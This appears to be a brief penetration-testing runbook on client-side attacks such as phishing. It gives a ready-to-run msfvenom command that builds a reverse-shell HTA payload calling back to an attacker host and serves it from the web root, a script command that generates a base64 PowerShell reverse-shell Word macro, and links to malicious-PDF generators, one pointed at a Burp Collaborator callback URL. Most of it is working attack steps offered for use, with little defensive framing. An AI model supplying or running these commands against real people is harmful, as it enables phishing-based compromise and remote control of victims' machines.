# Client-Side Attacks

## Introduction

This runbook is to help with Client-Side Attacks.  Client-Side Attacks are those attacks that are sent to clients, whe the client has to intiate the connection.  An example of this would be a phishing email.  The listener and backend have to be set up prior, and then client has to click the link in the email.

## Table of Content

- [Client-Side Attacks](#client-side-attacks)
  - [Introduction](#introduction)
  - [Table of Content](#table-of-content)
  - [HTA Attack in Action](#hta-attack-in-action)
  - [Microsoft Word Macro Attack](#microsoft-word-macro-attack)
  - [Malicious PDF](#malicious-pdf)

## HTA Attack in Action

- Get web browser name, operating system, device type  
https://explore.whatismybrowser.com/useragents/parse/#parse-useragent

- Creating a malicious .hta with msfvenom

```sh
sudo msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f hta-psh -o /var/www/html/evil.hta
```

## Microsoft Word Macro Attack

- Generate a malicious macro for reverse shell in powershell using base64 for .doc

```python
python evil_macro.py -l <ip> -p <port> -o macro.txt
```

https://github.com/rodolfomarianocy/Evil-Macro/

## Malicious PDF

- Malicious PDF Generator

```python
python3 malicious-pdf.py burp-collaborator-url
```

https://github.com/jonaslejon/malicious-pdf

- evilpdf  
https://github.com/superzerosec/evilpdf
